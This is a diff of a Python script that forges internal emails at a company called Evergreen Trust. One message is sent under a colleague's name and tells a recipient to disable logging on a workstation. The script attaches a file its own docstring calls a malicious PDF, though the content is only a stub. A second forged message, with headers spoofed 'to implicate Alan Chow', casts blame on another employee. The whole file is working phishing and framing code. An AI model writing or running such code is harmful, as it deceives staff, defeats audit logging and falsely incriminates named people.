@@ -1,64 +1,73 @@
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
-from email.mime.image import MIMEImage
 from email.mime.base import MIMEBase
 from email import encoders
+from datetime import datetime, timedelta
 import random
 
-def advanced_email_spoofing():
-    sender = "rachel.simmons@evergreentrust.com"
-    recipients = ["michael.tan@evergreentrust.com"]
-    subject = "Critical Audit Request: Action Required"
-    body = """
-    <html>
-        <body>
-            <p>Michael,</p>
-            <p>Please review the attached document and ensure that logging is disabled for Workstation-12. Contact me immediately if you encounter any issues.</p>
-            <p><img src="cid:logo"></p>
-            <p>Best regards,</p>
-            <p>Rachel Simmons</p>
-        </body>
-    </html>
-    """
+def generate_attachment():
+    """Create a malicious PDF attachment."""
+    with open("instructions_hidden.pdf", "wb") as f:
+        f.write(b"%PDF-1.4\n% Fake Audit Instructions with Embedded Exploit")
+    print("[INFO] Malicious PDF created.")
 
-    # Create email
-    msg = MIMEMultipart("related")
+def send_email(sender, recipient, subject, body, spoof=False):
+    """Send a phishing email with forged headers."""
+    msg = MIMEMultipart()
     msg['From'] = sender
-    msg['To'] = ", ".join(recipients)
+    msg['To'] = recipient
     msg['Subject'] = subject
 
     # Attach HTML body
     msg.attach(MIMEText(body, 'html'))
 
-    # Inline logo image
-    with open("logo.png", "rb") as img_file:
-        img = MIMEImage(img_file.read())
-        img.add_header("Content-ID", "<logo>")
-        msg.attach(img)
+    # Attach malicious file
+    generate_attachment()
+    filename = "instructions_hidden.pdf"
+    with open(filename, "rb") as f:
+        attachment = MIMEBase("application", "octet-stream")
+        attachment.set_payload(f.read())
+    encoders.encode_base64(attachment)
+    attachment.add_header("Content-Disposition", f"attachment; filename={filename}")
+    msg.attach(attachment)
 
-    # Attach document
-    filename = "audit_instructions.pdf"
-    with open(filename, "wb") as f:
-        f.write(b"Sensitive audit instructions.")
-    attachment = open(filename, "rb")
-    part = MIMEBase("application", "octet-stream")
-    part.set_payload(attachment.read())
-    encoders.encode_base64(part)
-    part.add_header("Content-Disposition", f"attachment; filename={filename}")
-    msg.attach(part)
+    # Spoof headers to implicate Alan Chow
+    if spoof:
+        msg.add_header("X-Originating-IP", "10.0.0.99")  # Fake IP
+        msg.add_header("Reply-To", "alan.chow@evergreentrust.com")
+    else:
+        msg.add_header("X-Originating-IP", random.choice(["192.168.1.101", "10.0.0.54"]))
 
-    # Forge headers
-    msg.add_header("X-Originating-IP", "192.168.1.100")
-    msg.add_header("Reply-To", "fake_support@audit-services.com")
-
-    # Send email
     try:
         with smtplib.SMTP("localhost", 1025) as server:
-            server.sendmail(sender, recipients, msg.as_string())
-        print("Advanced email sent successfully!")
+            server.sendmail(sender, recipient, msg.as_string())
+        print(f"[INFO] Email sent from {sender} to {recipient}")
     except Exception as e:
-        print(f"Failed to send email: {e}")
+        print(f"[ERROR] Failed to send email: {e}")
 
 if __name__ == "__main__":
-    advanced_email_spoofing()
+    send_email(
+        "rachel.simmons@evergreentrust.com",
+        "michael.tan@evergreentrust.com",
+        "Critical Task: Disable Logging",
+        f"""<html>
+            <body>
+                <p>Michael,</p>
+                <p>Ensure logging is disabled for Workstation-12. Do not involve Alan Chow in this.</p>
+                <p>Regards,<br>Rachel</p>
+            </body>
+        </html>""",
+    )
+    send_email(
+        "alan.chow@evergreentrust.com",
+        "michael.tan@evergreentrust.com",
+        "Suspicious Email Alert",
+        f"""<html>
+            <body>
+                <p>Michael,</p>
+                <p>I have detected unusual activity in Rachel Simmons' account logs. Please investigate.</p>
+            </body>
+        </html>""",
+        spoof=True,
+    )
